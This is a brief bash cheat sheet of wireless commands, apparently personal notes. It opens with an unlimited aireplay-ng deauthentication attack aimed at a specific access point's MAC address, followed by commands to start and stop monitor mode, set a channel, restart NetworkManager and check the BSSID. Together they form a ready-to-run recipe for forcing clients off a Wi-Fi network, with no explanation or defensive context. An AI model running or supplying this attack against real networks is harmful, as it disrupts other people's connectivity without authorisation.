


```bash

# initiate deauth attack
sudo aireplay-ng --deauth 0 -a aa:46:8d:39:49:ed wlan0mon

# monitor on channel 10
sudo iwconfig wlp4s0mon channel 10

# start monitor mode
sudo airmon-ng start wlp4s0

# stop monitor mode
sudo airmon-ng stop wlp4s0

# restart network manager
sudo systemctl restart NetworkManager

#check for  bsssid
sudo wpa_cli -i wlp4s0 status

```























